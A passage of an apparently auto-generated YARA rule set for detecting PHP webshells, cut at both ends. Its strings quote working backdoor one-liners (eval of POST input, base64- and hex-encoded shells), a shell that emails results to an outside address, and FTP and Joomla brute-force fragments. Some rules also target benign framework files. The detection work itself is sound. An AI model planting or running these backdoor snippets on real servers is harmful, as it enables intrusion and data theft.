      $s2 = "vnH4pSJQGiZ92p+MGVikXE9Ly3m1Y55kLUlDPdlLwImuAPk2vhsW/qiLZWusIJc5Dy/GPmtj+GiqfmvvOIg1XvT3HuTo7by2PaDvuPTt1axFmFSQAzkKkToL4oFVEh1i" ascii
      $s3 = "P6vSRzcqmitjfUBNBvWJOsj3jMRFz6c3BTLEYe1WQMunfA7MQBeBtwk4OZqwJsEvLkMOHUjvzGVnGHFxFVfLSGcKopSvKzzSSu1+Hh2U2XHW7kd6KNNOYcFAsUHVcjXk" ascii
      $s4 = "aNgzoWC8jONGmSduP4QWIUJXPF5PiYc8+8cxp3OsyM6oaG8QElm6VLUg4A0irCu6HDGESx707hShlN6QyyiSQWG6D9W5xOTC8P6wVILw4KFYcP4Xdbsc7uKN5LqOX5Sv" ascii
      $s5 = "M1A1626JP0CUvool82Mdtu8yGCMJB7c6bImlWJahCCJ8ZR4bVKjkjadbyrTeW5XSwPR0n3+pJw83npC2aG97IRi2hHFjDMqu0GkDy15au3k7/yGfwNBaKLkz9s3VpOlJ" ascii
      $s6 = "RM0eUKST0YN40HpIeuNpN94+lFhO1X6Jv3wKEySp0GmYX3hInPSgottOHF8XNPEWdWofTXlSCoJy2mgbT7Cf1qZhlYmDSxp4MBZ4TlZE5rFjVh9+euOqzSvzMgQ9xBm7" ascii
      $s7 = "I5zTmqSL2hPDEKtFHuPtjCnb3hXEcdSyGjo7xtZb9UDjRPRtYFsbAO0kQA0cQSdLCmPaXD8IjEF/tToLOtQtPYCCDqhOjJ0ug6mLuiZ1xBJ3y1e9HLFECmDdpJJLEfnr" ascii
      $s8 = "VGMZv0y76d7w/m0j4QwQBDFoTeLfCcau1G5RMPMge6FbjwPp8yLunzwZeZjPhkA+4xI0DHgMAmwFstDDeTdg26+V+q+OTo5hYmVIYEyEI5GQ5G6iIJXwcibljl1A88tW" ascii
      $s9 = "RXVxJ//Ra2MV6vUALC+tOqFcgfBQ1HLO5e8hOe2n0LJfl8PCLp5UFqtE2pwDtX0ftjcrP9c1CBRmjcpdKPvadNs9N1twsCkbWZhRD+6lnp4KWVYgL7iB0zAQHqUQEgIB" ascii
      $s10 = "0sdxdnJy3RpoVBvnix8DWc9avC+4q72Mh22nI7MNqXRROxtplmGJo2eI2NUm1aLy85Gw3TegWGEUd0jdbKMHSx0r9Dch80/DsLrGuokltcbaQP6Iv+A1r//RTpmsAv3Q" ascii
      $s11 = "JlX62FcSZuHJXMPYdfENEZnauo7JGig94xmQK24TKulIWxdA/EtoUOqC2Db+MbHG5f0PWLjqQJBZt4m00z1dTLTJCKdqASuDzsqUZZjAKVTlzuMZCySM4y0nf//dBh3/" ascii
      $s12 = "KNtwdaeparGLLuzHXux73Y4RM6VD6HYOopyGMJoYilWs7Y3eOl//2s7iq/pQy8YXH/FwRmFKJFbpxa1fnjw4MGW+Og28N/WDYetxoNqPP4KDNE0brFfZjF7Ne97A6f61" ascii
      $s13 = "u2GYRB2/WBkVw/PXr0yMyG5SwCRXa2bWRPnquteuf15jJhjb+JKEMim713fm3hxOUmcOCOv3/1zHsRu1A3nUwQS2QN36E2hq96dHHWhQ04Ojg6hf+xm7QE17t//gg4ep" ascii
      $s14 = "9Tfr/192vuaCTYf2n4wFdZy0VLL6yLd8h9//C7N8lpWr1zy/skTAHeItA/fUfh8InzRFemIpxwxcu4Lp4dQAKdUYjTSeuPfUJJl/N7pDHyCwebMiZKR6Nt/2o1vLtNp5" ascii
      $s15 = "HRH3YkT98dle8NmNeZNZn4wcMv2X3ZVr7sCefaGh4mrUI0/Y9cZuGGZwDYatTp7UH/ADoOY7Qfz6cCWVOCPe+XF4uvNv/8F//37XzuRG0VeMO1GsRPGZYTe8aZeN3Ljs" ascii
      $s16 = "XgfhUGvnSlsv+eWpRiQ0h+E+I/tdsnDv5LpMNESMZ9Kf3yu8bf4TLXnVsXuWDUBB4yGtbG94fCdQXYK3zaSl1X77HR//RGeee/olI/WG82HDfz+69HBo/Vj9ekMP/Vnj" ascii
      $s17 = "5ElZGB9FJLo7+EtxTOt7aDWcZfnuYMuMh2AY//g1R7ceob25082bD9drvKP/jv1HJ4qXslEt1u7wITD2Z88ga9ZwnSpB2vgYkujiKuoGMRc6G766KDJw94HTLFLdlYop" ascii
      $s18 = "DoLDi7eXkMd10fek4uDt1fzA49w/9FrPpx/fHdY/3X/8M1v9Xj/7S6Vp/atUP6y//ztHMqeHe/5R9B+7433keg5fvsbb+cExuXdg+Cscbx32kB6l8Mcv315kgszPXzY3" ascii
      $s19 = "8c2vjjeQoEEvgMJ9DazlALOSeRHZsiB0+rGmnkwaKGQVEwGyZHVerJy49PofawsOP5JRikt0MjlfxR//w18T1J2ZX4nKXIHPidVaDX+Jim0Ol+jWGQCVe8emu8Py9h9Z" ascii
      $s20 = "/AC/k4VTZHz/rBO0+B68UWbeqODi8Nxb/rbqPfc/zLIltt0nvsRLJkrKAPfg5cf3h3+8fE9tGvv8M3pxYPojJZR8BLGJzg4GV30n/sXb959vOxPopkss/suoa8HS/HgO" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule article_featureds_tags_fixture
{
   meta:
      description = "php17 - file article_featureds_tags_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cf34db959697214474a38d803a83891bc81a62d4ea2134495ebf5ee220c9e063"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s4 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s5 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s6 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s7 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s8 = "* Short description for file." fullword ascii
      $s9 = "'indexes' => array('UNIQUE_FEATURED' => array('column'=> array('article_featured_id', 'tag_id'), 'unique'=> 1))" fullword ascii
      $s10 = "* @var string 'ArticleFeaturedsTags'" fullword ascii
      $s11 = "* Short description for class." fullword ascii
      $s12 = "* fields property" fullword ascii
      $s13 = "* name property" fullword ascii
      $s14 = "'article_featured_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s15 = "'tag_id' => array('type' => 'integer', 'null' => false)," fullword ascii
      $s16 = "var $name = 'ArticleFeaturedsTags';" fullword ascii
      $s17 = "* @since         CakePHP(tm) v 1.2.0.4667" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_8341f6b49bab37058107cb712380a2a4d55b3aff
{
   meta:
      description = "php17 - file 8341f6b49bab37058107cb712380a2a4d55b3aff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc2aabda6f102584663ba8ccfe68a93b36220c1120e63c58849beef450fb038f"
   strings:
      $s1 = "echo filter_var($_POST['a'], FILTER_CALLBACK, array(\"options\"=>\"ff\"));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AdminSessionHandler
{
   meta:
      description = "php17 - file AdminSessionHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "82f4cf3ad7c7fb0d1880f1db469f252da4c76d217ddd9c1b3262050f50c65bd2"
   strings:
      $x1 = "* there is still an open session, this is especially important if something doesn't use the method use() but get()" fullword ascii
      $s2 = "$this->logger->debug('Not writing/closing session admin session {name} as there are still {count} open sessions', [" fullword ascii
      $s3 = "$this->logger->debug('Admin session {name} was successfully opened. Open admin sessions: {count}', [" fullword ascii
      $s4 = "* Contains how many sessions are currently open, this is important, because writeClose() must not be called if" fullword ascii
      $s5 = "$this->logger->debug('Admin session {name} was written and closed', [" fullword ascii
      $s6 = "$this->logger->debug('Opening admin session {name}', ['name' => $sessionName]);" fullword ascii
      $s7 = "class AdminSessionHandler extends AbstractAdminSessionHandler implements LoggerAwareInterface" fullword ascii
      $s8 = "* so the session isn't closed automatically after the action is done" fullword ascii
      $s9 = "use Symfony\\Component\\HttpFoundation\\Session\\SessionInterface;" fullword ascii
      $s10 = "use Psr\\Log\\LoggerAwareInterface;" fullword ascii
      $s11 = "use Psr\\Log\\LoggerAwareTrait;" fullword ascii
      $s12 = "'name'  => $this->getSessionName()," fullword ascii
      $s13 = "$sessionName = $this->getSessionName();" fullword ascii
      $s14 = "use LoggerAwareTrait;" fullword ascii
      $s15 = "'name' => $this->getSessionName()" fullword ascii
      $s16 = "namespace Pimcore\\Bundle\\AdminBundle\\Session\\Handler;" fullword ascii
      $s17 = "private $openedSessions = 0;" fullword ascii
      $s18 = "public function loadSession(): SessionInterface" fullword ascii
      $s19 = "if (!$this->session->isStarted()) {" fullword ascii
      $s20 = "if (0 === $this->openedSessions) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule AssignmentFilter
{
   meta:
      description = "php17 - file AssignmentFilter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "99b7a8f1170214c2aa8107426dd3872135e414eee77301a7923ce1e697d3fa70"
   strings:
      $x1 = "* @author    RocketTheme http://www.rockettheme.com" fullword ascii
      $s2 = "* @copyright Copyright (C) 2007 - 2017 RocketTheme, LLC" fullword ascii
      $s3 = "* Gantry Framework code that extends GPL code is considered GNU/GPLv2 and later" fullword ascii
      $s4 = "* http://www.gnu.org/licenses/gpl-2.0.html" fullword ascii
      $s5 = "* http://opensource.org/licenses/MIT" fullword ascii
      $s6 = "$scores[$type] = $this->getScore($candidate) + (isset($candidate['language']) ? 0.01 : 0);" fullword ascii
      $s7 = "* Return all matching candidates with their score. Candidates are ordered by their scores." fullword ascii
      $s8 = "if (isset($matches[$type]) && $function && call_user_func($function, $candidate, $matches[$type], $page) === false) {" fullword ascii
      $s9 = "if (isset($matches[$type]) && $function && call_user_func($function, $candidate, $matches[$type], $page) === false) " fullword ascii
      $s10 = "* @param array $candidates  In format of candidates[name][section][rule]." fullword ascii
      $s11 = "public function getScore(array &$matches, $method = 'max')" fullword ascii
      $s12 = "* @package Gantry\\Assignments" fullword ascii
      $s13 = "* @param float|array $item" fullword ascii
      $s14 = "$match = \\array_intersect_key($page[$section][$name], $rules);" fullword ascii
      $s15 = "* Returns the calculated score for the assignment." fullword ascii
      $s16 = "* @param array $page        In format of page[section][rule]." fullword ascii
      $s17 = "* Returns all matching candidates with matching rules." fullword ascii
      $s18 = "* @param float $item" fullword ascii
      $s19 = "* @license   Dual License: MIT or GNU/GPLv2 and later" fullword ascii
      $s20 = "namespace Gantry\\Component\\Assignments;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule php17_adapter
{
   meta:
      description = "php17 - file adapter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "800e19d24e640f07eadd1ec427f0c48f952c50d2d0aea463118a45d36d9f9466"
   strings:
      $s1 = "protected function setInvoker($functionName, \\closure $factory = null)" fullword ascii
      $s2 = "return new mocker\\adapter\\invoker($functionName);" fullword ascii
      $s3 = "return parent::setInvoker($functionName, $factory);" fullword ascii
      $s4 = "namespace mageekguy\\atoum\\php\\mocker;" fullword ascii
      $s5 = "$factory = function ($functionName) {" fullword ascii
      $s6 = "use mageekguy\\atoum\\php\\mocker;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2786d845ca82d4a4c18b2cf5b6dbf985aea5720c
{
   meta:
      description = "php17 - file 2786d845ca82d4a4c18b2cf5b6dbf985aea5720c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "afd7591aefd101add5777024b40cb3e9b13b6b2fd0aef1b9a8499832077fe5eb"
   strings:
      $s1 = "$post_content = preg_replace('!<div id=\"wp_cd_code\">(.*?)</div>!s', '', $data -> post_content);" fullword ascii
      $s2 = "print '<meta name=\"Description\" content=\"'.stripslashes($data -> description).'\" />';" fullword ascii
      $s3 = "print '<meta name=\"Keywords\" content=\"'.stripslashes($data -> keywords).'\" />';" fullword ascii
      $s4 = "if (preg_match('!<div id=\"wp_cd_code\">(.*?)</div>!s', $data['post_content'], $_))" fullword ascii
      $s5 = "print '<meta name=\"viewport\" content=\"width=device-width\">';" fullword ascii
      $s6 = "if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = \"/'.mysql_escape_string($_REQUEST['url']).'\"'))" fullword ascii
      $s7 = "bloginfo( 'pingback_url' );" fullword ascii
      $s8 = "bloginfo( 'charset' );" fullword ascii
      $s9 = "print '<link rel=\"profile\" href=\"http://gmpg.org/xfn/11\">';" fullword ascii
      $s10 = "print stripslashes($data -> content);" fullword ascii
      $s11 = "elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))" fullword ascii
      $s12 = "if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = \"/'.mysql_escape_string($_REQUEST['url']).'\", `tit" ascii
      $s13 = "print '<meta name=\"robots\" content=\"index, follow\" />';" fullword ascii
      $s14 = "if ($data -> full_content)" fullword ascii
      $s15 = "print '<title>'.stripslashes($data -> title).'</title>';" fullword ascii
      $s16 = "if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id=\"wp_cd_code\">' . stripcslashes($_REQUEST['data']) . '<" ascii
      $s17 = "if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id=\"wp_cd_code\">' . stripcslashes($_REQUEST['data']) . '<" ascii
      $s18 = "if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5f4dcc3b5aa765d61d8327deb882cf99'))" ascii
      $s19 = "$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = \"'.mysql_escape_string($_REQUEST" ascii
      $s20 = "$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = \"'.mysql_escape_string($_REQUEST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_2588a3a77ad6b106c99bc7435973a4ab8fb6fb4c
{
   meta:
      description = "php17 - file 2588a3a77ad6b106c99bc7435973a4ab8fb6fb4c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a01da2fe31e8a86e79254b2575b244fb210e9d1e1a9c57563d01a5e78eaaf0a"
   strings:
      $s1 = "<?php if(isset($_POST[\"f4ck\"])){$a=strrev(\"edoced_46esab\");eval($a($_POST[z0]));}?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_691a4634dc5f78ceee68850138b8b68047b8dca6
{
   meta:
      description = "php17 - file 691a4634dc5f78ceee68850138b8b68047b8dca6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s3 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',15,'irc.dal.net'));" fullword ascii
      $s4 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s5 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s6 = "com | <a href http://www.alturks.com</a> | version \".$version.\" ]</b></font></div></td></tr></table>\".$f;" fullword ascii
      $s7 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s8 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s9 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s10 = "@readfile (\"http://127.0.0.1/KingDefacer/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s11 = "tp_password']):(\"billgates@microsoft.com\"))));" fullword ascii
      $s12 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s13 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s14 = "if(empty($_POST['from'])) { $_POST['from'] = 'x.neo@hotmail.com'; }" fullword ascii
      $s15 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s16 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s17 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s18 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s19 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s20 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_8a19a4d1bd3d051a8fad6d61af48fb86f3a76a18
{
   meta:
      description = "php17 - file 8a19a4d1bd3d051a8fad6d61af48fb86f3a76a18.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "970b3c191313781bbc28f01361c999ad9c31043340496522d54f68caae47ceac"
   strings:
      $s1 = "ob_start(function ($c,$d){register_shutdown_function('assert',$c);}); " fullword ascii
      $s2 = "echo $_REQUEST['pass']; " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a9444e0d89d81f2ef0c79c5800bf1a873593dfc0
{
   meta:
      description = "php17 - file a9444e0d89d81f2ef0c79c5800bf1a873593dfc0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c2d08c62473b5eed9c8112f6051571f4f05ad1509effc6d308b2e3bfac05e0ef"
   strings:
      $s1 = "<?php ($_=@$_GET[2]).@$_($_POST[1])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1b6a5c0d98f4077ca9af5a8b3413e4a2a03b443f
{
   meta:
      description = "php17 - file 1b6a5c0d98f4077ca9af5a8b3413e4a2a03b443f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f45fbf747731a63c5a2a82e2d2e2868b12772b0b5a5f3f04501b6a028e8aaa97"
   strings:
      $s1 = "eval ( ${ $yqyx1 }['q7f2521']); }?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AnonConsumerCommand
{
   meta:
      description = "php17 - file AnonConsumerCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9fa00ba2ca71ccf515ac173eb4cf6a37946ed9839ce9f41f4ad538d68109241a"
   strings:
      $s1 = "$this->setDescription('Executes an anonymous consumer');" fullword ascii
      $s2 = "namespace OldSound\\RabbitMqBundle\\Command;" fullword ascii
      $s3 = "$this->getDefinition()->getOption('messages')->setDefault(1);" fullword ascii
      $s4 = "protected function getConsumerService()" fullword ascii
      $s5 = "$this->getDefinition()->getOption('route')->setDefault('#');" fullword ascii
      $s6 = "class AnonConsumerCommand extends BaseConsumerCommand" fullword ascii
      $s7 = "return 'old_sound_rabbit_mq.%s_anon';" fullword ascii
      $s8 = "protected function configure()" fullword ascii
      $s9 = "$this->setName('rabbitmq:anon-consumer');" fullword ascii
      $s10 = "parent::configure();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ApcuTest
{
   meta:
      description = "php17 - file ApcuTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b8b1c89c4f54c436e66886682260f25641bd61a0a0a451eff7f210c5fea4e171"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @link      https://phalconphp.com" fullword ascii
      $s3 = "* @author    Andres Gutierrez <andres@phalconphp.com>" fullword ascii
      $s4 = "* @author    Serghei Iakovlev <serghei@phalconphp.com>" fullword ascii
      $s5 = "* executed before each test" fullword ascii
      $s6 = "* bundled with this package in the file LICENSE.txt" fullword ascii
      $s7 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s8 = "* Tests for \\Phalcon\\Annotations\\Adapter\\Apcu component" fullword ascii
      $s9 = "* If you did not receive a copy of the license and are unable to obtain it" fullword ascii
      $s10 = "$this->assertEquals(get_class($classAnnotations->getClassAnnotations()), 'Phalcon\\Annotations\\Collection');" fullword ascii
      $s11 = "* \\Phalcon\\Test\\Unit\\Annotations\\Adapter\\ApcuTest" fullword ascii
      $s12 = "* @copyright (c) 2011-2017 Phalcon Team" fullword ascii
      $s13 = "$this->assertEquals(get_class($classAnnotations), 'Phalcon\\Annotations\\Reflection');" fullword ascii
      $s14 = "$this->assertEquals(get_class($property), 'Phalcon\\Annotations\\Collection');" fullword ascii
      $s15 = "$classAnnotations = $adapter->get('User\\TestClassNs');" fullword ascii
      $s16 = "* so that we can send you a copy immediately." fullword ascii
      $s17 = "* @package   Phalcon\\Test\\Unit\\Annotations" fullword ascii
      $s18 = "$property = $adapter->getProperty('TestClass', 'testProp1');" fullword ascii
      $s19 = "$this->markTestSkipped('Warning: APCu extension is not loaded');" fullword ascii
      $s20 = "$classAnnotations = $adapter->get('TestClass');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule sig_469495bf7e45d7fa734e9977025665aa7fd51d85
{
   meta:
      description = "php17 - file 469495bf7e45d7fa734e9977025665aa7fd51d85.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a342f9842380b596753363a07e0beb247d0c115c554673c0f48463f7f15825f"
   strings:
      $s1 = "<p>The requested URL /error.php was not found on this server.</p>" fullword ascii
      $s2 = "header('HTTP/1.1 404 Not Found');" fullword ascii
      $s3 = "@preg_replace(\"/[checksql]/e\",$_POST['date'],\"saft\");" fullword ascii
      $s4 = "<O>date=@eval($_POST[caicai]);</O> " fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule ArrayAccessible
{
   meta:
      description = "php17 - file ArrayAccessible.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6bb65928883612d396859a88351b168ae1d0eefaa3d9289e5073126024372cd9"
   strings:
      $s1 = "public function __construct(array $array = [])" fullword ascii
      $s2 = "private $array;" fullword ascii
      $s3 = "return new ArrayIterator($this->array);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule ActionArgumentsBundle
{
   meta:
      description = "php17 - file ActionArgumentsBundle.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "913d1cd4c377e5f637d5d231f6d7c6afaea53ccc1f004ccf4e33094e475a396d"
   strings:
      $s1 = "use Symfony\\Component\\HttpKernel\\Bundle\\Bundle;" fullword ascii
      $s2 = "namespace Tests\\Fixtures\\ActionArgumentsBundle;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_045117b0e0a11a242b9765e79cbf113f
{
   meta:
      description = "php17 - file 045117b0e0a11a242b9765e79cbf113f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5bb64310e1ebc50d776523ae5541a121fbbb0495ec74c29e2a3d6d7a5ed2d812"
   strings:
      $s1 = "mail(\"peterdlegend@aol.com\", \"$body\", \"Shell Result http://$web$inj" fullword ascii
      $s2 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec('ls -la') . \"</font></pre>\";" fullword ascii
      $s3 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec($cmd) . \"</font></pre>\";" fullword ascii
      $s4 = "echo '<form enctype=\"multipart/form-data\" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input " fullword ascii
      $s5 = "echo \"<title>Peterson - Shell</title><br><br>\";" fullword ascii
      $s6 = "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s7 = "$body = \"Shell Injector " fullword ascii
      $s8 = "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);" fullword ascii
      $s9 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {" fullword ascii
      $s10 = "$conf = file_get_contents(\"../../configuration.php\");" fullword ascii
      $s11 = "$serper = gethostbyname($_SERVER['SERVER_ADDR']);" fullword ascii
      $s12 = "if ((@function_exists('ini_get')) && ('' == ($df = @ini_get('disable_functions')))) {" fullword ascii
      $s13 = "ype=\"Submit\" name=\"command\" value=\"cok\"></form>';" fullword ascii
      $s14 = "IP Injector= $injektor\");" fullword ascii
      $s15 = "$cur_user = \"(\" . get_current_user() . \")\";" fullword ascii
      $s16 = "$cmd = $_POST['cmd'];" fullword ascii
      $s17 = "$desti = $_SERVER['DOCUMENT_ROOT'] . \"/wp-info.php\";" fullword ascii
      $s18 = "if (isset($_POST['command'])) {" fullword ascii
      $s19 = "$web = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s20 = "if ($u != strlen($cwd) - 1) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule sig_5c56eb0034267b7b436961d5f160ea546b776735
{
   meta:
      description = "php17 - file 5c56eb0034267b7b436961d5f160ea546b776735.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e4ffd4ec67762fe00bb8bd9fbff78cffefdb96c16fe7551b5505d319a90fa18f"
   strings:
      $s1 = "$f=$_SERVER['DOCUMENT_ROOT'].'/data/sessions/sess_'.$t;" fullword ascii
      $s2 = "//<?php @eval($_POST['guige'])?>" fullword ascii
      $s3 = "@file_put_contents($f,$cfg_ml);" fullword ascii
      $s4 = "WEBSHELL" fullword ascii
      $s5 = "$f=$_SERVER['DOCUMENT_ROOT'].'/'.$t;" fullword ascii
      $s6 = "$f=$_SERVER['DOCUMENT_ROOT'].'/a/'.$t;" fullword ascii
      $s7 = "$cfg_ml='PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+';" fullword ascii
      $s8 = "$cfg_ml = base64_decode($cfg_ml);" fullword ascii
      $s9 = "$f='/tmp/'.$t;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_774d666c2bbf03320fdac09dad2c94e95c6eef1d
{
   meta:
      description = "php17 - file 774d666c2bbf03320fdac09dad2c94e95c6eef1d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "60d484bedef42cc350b09efe38db22a878913855c64e154f1045395d0f01ada1"
   strings:
      $s1 = "3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e" ascii
      $s2 = "6c6f7374776f6c662e706870" ascii
      $s3 = "<script language=\"php\">" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 1KB and
      all of them
}

rule sig_683f78842d7cf41a39744494a4bb787d6c6c4e91
{
   meta:
      description = "php17 - file 683f78842d7cf41a39744494a4bb787d6c6c4e91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
   strings:
      $x1 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';" fullword ascii
      $x2 = "$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<br><b" ascii
      $x3 = "$x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);" fullword ascii
      $x4 = "echo\"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>\";" fullword ascii
      $x5 = "<center><p>Tanks To <a href=\"https://www.facebook.com/anton115\" target=\"_blank\">Cah_bagus</a></p></b></center>" fullword ascii
      $x6 = "curl_setopt($ch, CURLOPT_POSTFIELDS,\"username=admin&passwd=123456789&option=com_login&task=login&\".$hidden.\"=1\");" fullword ascii
      $x7 = "echo \"<center/><br/><b><font color=#00ff00>-=[ Command  Bypass Exploit ]=-</font></b><br>" fullword ascii
      $x8 = "{echo \"<p>\".$host.\" => <font color='red'>Error In Login Page !</font></p>\";ob_flush();flush();continue;}" fullword ascii
      $x9 = "document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';" fullword ascii
      $x10 = "/* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:\" 1n73ction \") */ " fullword ascii
      $x11 = "$f = fopen(\"Result.txt\",\"a+\"); fwrite($f , \"Success ~~ $user:$pass -> $site/administrator/index.php\\n\"); fclose($f); " fullword ascii
